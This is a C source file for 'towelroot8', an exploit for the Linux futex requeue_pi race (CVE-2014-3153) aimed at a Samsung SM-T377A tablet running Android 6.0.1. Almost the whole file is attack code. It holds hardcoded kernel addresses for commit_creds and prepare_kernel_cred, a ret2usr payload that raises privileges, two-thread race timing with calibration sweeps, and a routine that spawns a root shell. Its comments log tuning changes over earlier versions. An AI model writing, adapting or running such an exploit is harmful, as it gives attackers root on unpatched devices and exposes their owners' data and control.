/*
 * towelroot8.c — CVE-2014-3153 tight-spin timing + geohot-style round protocol
 *
 * Target: Samsung SM-T377A, Android 6.0.1, kernel 3.10.9 ARMv7
 *         No KASLR, No PXN, No stack canaries
 *
 * FIXES over towelroot7:
 *
 *   BUG — sched_yield() inside busy_wait causes overshooting:
 *     towelroot7's busy_wait_us() called sched_yield() on every iteration.
 *     sched_yield() hands the CPU to other threads. If an Android background
 *     thread takes the CPU for 1-10ms, main's "busy wait" sleeps for far
 *     longer than intended — causing us to fire AFTER victim's timeout → 0 hits.
 *     Also, g_in_futex signaling is fragile: victim can be preempted between
 *     setting g_in_futex=1 and entering the futex syscall.
 *
 *   FIX 1 — True tight-spin: pure `while (ns_now() < deadline)` with no
 *     yield/sleep. Clock reads are vDSO (no syscall), ~200ns each. Accurate
 *     to <1µs. CPU 1 burns at 100% during the spin — acceptable since victim
 *     is on CPU 0 (independent).
 *
 *   FIX 2 — Geohot-style round start: BOTH threads released simultaneously.
 *     Victim enters WAIT_REQUEUE_PI immediately. Main tight-spins for (T-delta)µs.
 *     With T=5ms, even if victim takes 200µs to enter the futex, main fires at
 *     4.8ms (delta=200µs) — victim has had 4.6ms to enter. Reliable.
 *     No g_in_futex signaling needed.
 *
 * ANALYSIS of prior towelroot results:
 *   towelroot5 (80K iters): 0 anomalies — firing at t=0 (before victim in futex)
 *   towelroot6 at delta=+100µs: DEADLOCK — nanosleep overshooting to ~3ms,
 *     occasionally firing exactly when victim times out → race fires → pi_state
 *     corrupted → next LOCK_PI hangs. Confirmed the race IS triggerable.
 *   towelroot7 (all deltas): 0 hits — sched_yield() in busy_wait causing 5-15ms
 *     overshoots, always firing after victim's 3ms timeout.
 *
 * RACE MODEL:
 *   T = 5ms victim timeout.
 *   Main fires CMP_REQUEUE_PI at t = T - delta_us from round start.
 *   For delta near 0: fires right as victim's hrtimer expires.
 *   Race: CPU 0 hrtimer fires, victim begins timeout cleanup (futex_wait_requeue_pi
 *         timeout path); CPU 1 executes futex_requeue → rt_mutex_start_proxy_lock.
 *   These two paths race on pi_state ownership, causing exploitable corruption
 *   in kernel 3.10 (unpatched on SM-T377A as confirmed by STATUS.md).
 *
 * KEY DIAGNOSTICS:
 *   requeue_hits: CMP_REQUEUE_PI returned >0 (victim was in futex when we fired)
 *   race_events:  next round's LOCK_PI timed out (pi_state corrupted = race fired)
 *     → race_events > 0 at a specific delta = confirmed race window
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <linux/futex.h>
#include <stdatomic.h>

/* ========== Device-specific constants ========== */
#define COMMIT_CREDS        0xC0054328UL
#define PREPARE_KERNEL_CRED 0xC00548E0UL

/* ========== Futex layout — separate cache lines ========== */
static volatile int *fmem;
#define F1  ((volatile int *)&fmem[0])
#define F2  ((volatile int *)&fmem[16])

/* ========== Round synchronization ========== */
/*
 * g_round: incremented by main each round. Victim waits for new round value.
 * g_vdone: set to g_round value when victim finishes its futex op.
 * g_timeout_us: victim's WAIT_REQUEUE_PI timeout (set once before loop).
 */
static atomic_int g_round    = ATOMIC_VAR_INIT(0);
static atomic_int g_vdone    = ATOMIC_VAR_INIT(0);
static atomic_int g_go       = ATOMIC_VAR_INIT(0); /* -1=exit */
static atomic_int g_anomalies  = ATOMIC_VAR_INIT(0);
static atomic_int g_requeues   = ATOMIC_VAR_INIT(0);
static atomic_int g_race_events = ATOMIC_VAR_INIT(0);
static atomic_int g_root      = ATOMIC_VAR_INIT(0);
static int g_timeout_us = 5000;

/* ========== Timing — tight spin only ========== */
static inline long long ns_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

/*
 * Tight busy-spin for exactly `us` microseconds.
 * NO sched_yield/nanosleep — those allow preemption and cause timing overruns.
 * Uses vDSO clock_gettime, ~200ns per iteration. Main thread stays on CPU 1
 * for the entire duration; victim is independently on CPU 0.
 */
static void spin_us(int us) {
    if (us <= 0) return;
    long long deadline = ns_now() + (long long)us * 1000LL;
    while (ns_now() < deadline) {
        /* barrier: prevent compiler from optimizing away the loop */
        __asm__ volatile("" ::: "memory");
    }
}

static struct timespec abs_mono_us(int us) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += (long)us * 1000L;
    while (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
    return ts;
}

/* ========== CPU pinning ========== */
static void pin_to_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

/* ========== ret2usr payload ========== */
static void __attribute__((noinline, optimize("O0"), used))
kernel_payload(void) {
    void *(*pkc)(unsigned long)   = (void *(*)(unsigned long))PREPARE_KERNEL_CRED;
    int   (*cc)(void *)           = (int (*)(void *))COMMIT_CREDS;
    void *cred = NULL;
    __asm__ volatile(
        "mov  r0, #0\n\t"
        "blx  %1\n\t"
        "mov  %0, r0\n\t"
        : "=r"(cred) : "r"(pkc) : "r0", "r1", "r2", "r3", "lr"
    );
    if (cred) {
        __asm__ volatile(
            "mov  r0, %0\n\t"
            "blx  %1\n\t"
            : : "r"(cred), "r"(cc) : "r0", "r1", "r2", "r3", "lr"
        );
    }
}

static int check_root(void) {
    if (getuid() == 0 || geteuid() == 0) {
        atomic_store(&g_root, 1);
        return 1;
    }
    return 0;
}

static void spawn_shell(void) {
    printf("[!!!] UID=0 — spawning root shell!\n");
    fflush(stdout);
    execl("/system/bin/sh", "sh", NULL);
    _exit(0);
}

/* ========== Victim thread ========== */
/*
 * Loops waiting for each new round (g_round counter), then immediately enters
 * WAIT_REQUEUE_PI. No pre-signal to main — both start together.
 *
 * Victim on CPU 0. Main on CPU 1. True concurrent kernel execution.
 */
static void *victim_thread(void *arg) {
    (void)arg;
    pin_to_cpu(0);

    int my_round = 0;

    while (1) {
        if (atomic_load(&g_go) == -1) break;

        /* Wait for main to start a new round */
        int r;
        do {
            r = atomic_load(&g_round);
            if (atomic_load(&g_go) == -1) goto done;
            sched_yield();
        } while (r <= my_round);
        my_round = r;

        /*
         * Enter WAIT_REQUEUE_PI immediately.
         * Main simultaneously starts its tight spin for (T - delta)µs.
         * Both started "at the same time" (within the g_round signaling latency,
         * typically 5-50µs on ARM — well within our 5ms timeout margin).
         */
        struct timespec ts = abs_mono_us(g_timeout_us);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        int err = errno;

        if (ret == 0) {
            /* Requeued and became PI owner of F2 */
            if (check_root()) {
                atomic_store(&g_vdone, my_round);
                return (void *)1;
            }
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        } else if (err != ETIMEDOUT && err != EAGAIN && err != EINTR) {
            atomic_fetch_add(&g_anomalies, 1);
        }

        atomic_store(&g_vdone, my_round);
    }
done:
    return NULL;
}

/* ========== Single race round ========== */
/*
 * delta_us: how many µs before the timeout to fire CMP_REQUEUE_PI.
 *   delta_us > 0: fire before timeout (victim still waiting, high hit rate)
 *   delta_us = 0: fire exactly at timeout (race window!)
 *   delta_us < 0: fire after timeout (victim cleaned up, 0 hits — diagnose overshoots)
 *
 * Main starts tight-spin at the same moment victim sees g_round incremented.
 * The spin duration is (T - delta_us)µs.
 *
 * Returns: 1=root, 0=clean, -1=race_event (LOCK_PI timeout = pi_state corrupt)
 */
static int race_once(int delta_us, int *requeued) {
    /* Reset futex words */
    *F1 = 0;
    *F2 = 0;

    /*
     * LOCK_PI with 15ms timeout. Normal: immediate (F2 uncontested).
     * Race event: ETIMEDOUT (previous round corrupted pi_state; F2 appears
     * owned by a ghost thread that will never release it).
     */
    {
        struct timespec lts = abs_mono_us(15000); /* 15ms */
        int r = syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, &lts, NULL, 0);
        if (r != 0) {
            /*
             * LOCK_PI timed out — pi_state from prior round is corrupt.
             * This is a RACE EVENT: the race fired and corrupted the kernel state.
             * Recovery: force-reset F2, wake everything, skip this round.
             */
            atomic_fetch_add(&g_race_events, 1);
            *F2 = 0;
            syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
            syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
            if (requeued) *requeued = 0;
            /* Do a dummy round to let victim cycle */
            int cur = atomic_load(&g_round);
            atomic_fetch_add(&g_round, 1);
            while (atomic_load(&g_vdone) <= cur) sched_yield();
            return check_root() ? 1 : -1;
        }
    }

    /* F2 is now locked by main. Start the round. */
    int cur_round = atomic_load(&g_round);

    /*
     * Increment g_round to release victim. Victim will immediately call
     * WAIT_REQUEUE_PI. Main starts tight-spin at the same instant.
     *
     * Both operations happen "at the same time" because:
     * 1. atomic_fetch_add writes the new g_round value.
     * 2. Victim sees the new value on CPU 0 within ~1-10µs (cache coherence).
     * 3. Victim enters futex syscall within ~2-20µs of seeing the new round.
     * 4. Main starts spin_us((T - delta_us) - 20) immediately after the atomic.
     *    The -20µs accounts for the g_round-to-futex-entry latency.
     * With T=5ms and delta_us in [2000...-500], victim is reliably in the
     * futex before main's spin completes (even if victim takes 200µs to enter).
     */
    atomic_fetch_add(&g_round, 1);
    long long t_start = ns_now();

    int spin_us_val = g_timeout_us - delta_us - 20; /* 20µs: latency margin */
    if (spin_us_val > 0) spin_us(spin_us_val);

    long long t_fire = ns_now();
    long long actual_us = (t_fire - t_start) / 1000LL;

    /* FIRE: race with victim's hrtimer expiry */
    int rq = (int)syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI, 0,
                           (void *)(intptr_t)1, (void *)F2, 0);
    if (requeued) *requeued = (rq > 0) ? 1 : 0;
    if (rq > 0) atomic_fetch_add(&g_requeues, 1);

    /* Unlock F2 (main is PI owner, this is valid) */
    syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    /* Ensure victim wakes even if requeue missed */
    syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

    /* Wait for victim to finish this round */
    int target_round = cur_round + 1;
    while (atomic_load(&g_vdone) < target_round && !atomic_load(&g_root))
        sched_yield();

    (void)actual_us;

    if (atomic_load(&g_root)) return 1;
    return 0;
}

/* ========== Calibration sweep ========== */
static int calibration_sweep(int timeout_us, int iters_per_delta, int bulk_iters) {
    /*
     * Sweep: from delta=2000µs (fire 2ms before timeout, should be 100% hits)
     * down to delta=-500µs (fire 500µs after, should be 0% hits).
     * Race window is near delta=0.
     */
    static const int deltas[] = {
        2000, 1500, 1000, 700, 500, 300, 200, 100, 50, 25, 0, -50, -100, -200, -500
    };
    static const int ndelta = 15;

    g_timeout_us = timeout_us;

    printf("\n[*] === Calibration sweep T=%dµs tight-spin ===\n", timeout_us);
    printf("[*]   delta     hits  race_events  anomalies\n");
    fflush(stdout);

    pthread_t vtid;
    atomic_store(&g_go, 0);
    atomic_store(&g_vdone, 0);
    atomic_store(&g_round, 0);
    pthread_create(&vtid, NULL, victim_thread, NULL);

    pin_to_cpu(1);

    int best_delta = 0;
    int best_race = 0;

    for (int d = 0; d < ndelta; d++) {
        int delta = deltas[d];
        int hits  = 0;
        int re0   = atomic_load(&g_race_events);
        int an0   = atomic_load(&g_anomalies);

        for (int i = 0; i < iters_per_delta; i++) {
            int rq = 0;
            int r  = race_once(delta, &rq);
            if (rq) hits++;
            if (r == 1 || atomic_load(&g_root)) goto root_achieved;
        }

        int new_re = atomic_load(&g_race_events) - re0;
        int new_an = atomic_load(&g_anomalies)   - an0;
        int pct    = hits * 100 / iters_per_delta;

        printf("[*]  %+6dµs   %3d%%    %5d        %5d    uid=%d\n",
               delta, pct, new_re, new_an, getuid());
        fflush(stdout);

        if (new_re > best_race) {
            best_race  = new_re;
            best_delta = delta;
        }
    }

    if (best_race == 0) {
        printf("[!] No race events yet — using delta=0 for bulk run\n");
        best_delta = 0;
    } else {
        printf("[*] Best delta: %+dµs (%d race events)\n", best_delta, best_race);
    }

    printf("[*] Bulk: %d iters at T=%dµs delta=%+dµs\n",
           bulk_iters, timeout_us, best_delta);
    fflush(stdout);

    {
        long long t0 = ns_now();
        int re0 = atomic_load(&g_race_events);
        int rq0 = atomic_load(&g_requeues);
        int an0 = atomic_load(&g_anomalies);

        for (int i = 0; i < bulk_iters; i++) {
            int r = race_once(best_delta, NULL);
            if (r == 1 || atomic_load(&g_root)) goto root_achieved;

            if ((i + 1) % 2000 == 0) {
                long long ms = (ns_now() - t0) / 1000000LL;
                printf("[*]  %5d/%d | race_events=%d requeues=%d anomalies=%d | uid=%d | %lldms\n",
                       i + 1, bulk_iters,
                       atomic_load(&g_race_events) - re0,
                       atomic_load(&g_requeues) - rq0,
                       atomic_load(&g_anomalies) - an0,
                       getuid(), ms);
                fflush(stdout);
            }
        }

        printf("[*] Bulk done: race_events=%d requeues=%d anomalies=%d uid=%d\n",
               atomic_load(&g_race_events) - re0,
               atomic_load(&g_requeues) - rq0,
               atomic_load(&g_anomalies) - an0,
               getuid());
        fflush(stdout);
    }

    atomic_store(&g_go, -1);
    pthread_join(vtid, NULL);
    return 0;

root_achieved:
    atomic_store(&g_go, -1);
    pthread_join(vtid, NULL);
    return 1;
}

/* ========== Main ========== */
int main(void) {
    printf("=== towelroot8 — CVE-2014-3153 tight-spin geohot-style — SM-T377A ===\n");
    printf("[*] pid=%d uid=%d euid=%d\n", getpid(), getuid(), geteuid());
    printf("[*] commit_creds=0x%08lX  prepare_kernel_cred=0x%08lX\n",
           COMMIT_CREDS, PREPARE_KERNEL_CRED);
    fflush(stdout);

    {
        int ft = 0;
        int r = syscall(SYS_futex, &ft, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
        if (r != 0 && errno == ENOSYS) {
            fprintf(stderr, "[-] FUTEX_LOCK_PI not supported\n");
            return 1;
        }
        syscall(SYS_futex, &ft, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[+] FUTEX_LOCK_PI available\n");
    }

    int ncpu = (int)sysconf(_SC_NPROCESSORS_ONLN);
    printf("[*] CPUs online: %d\n", ncpu);
    if (ncpu < 2) { fprintf(stderr, "[-] Need >= 2 CPUs\n"); return 1; }

    /* Calibrate spin_us accuracy */
    {
        long long t0 = ns_now();
        spin_us(1000);
        long long actual = (ns_now() - t0) / 1000LL;
        printf("[*] spin_us calibration: requested=1000µs actual=%lldµs\n", actual);
        t0 = ns_now();
        spin_us(5000);
        actual = (ns_now() - t0) / 1000LL;
        printf("[*] spin_us calibration: requested=5000µs actual=%lldµs\n", actual);
        fflush(stdout);
    }

    fmem = (volatile int *)mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                                 MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (fmem == MAP_FAILED) { perror("mmap"); return 1; }

    /*
     * Phase 1: T=5ms calibration sweep.
     * 5ms gives 4.8ms margin for victim to enter the futex before delta=200µs fires.
     * 15 delta values × 300 iters each, then 30K bulk at best delta.
     */
    if (calibration_sweep(5000, 300, 30000)) goto root;

    /*
     * Phase 2: T=3ms sweep. Faster iterations (3ms per round).
     */
    if (calibration_sweep(3000, 300, 20000)) goto root;

    /*
     * Phase 3: T=10ms sweep. Maximum scheduling tolerance.
     */
    if (calibration_sweep(10000, 200, 15000)) goto root;

    printf("\n[*] All phases complete. uid=%d\n", getuid());
    fflush(stdout);
    return 0;

root:
    if (getuid() == 0 || geteuid() == 0) spawn_shell();
    return 0;
}
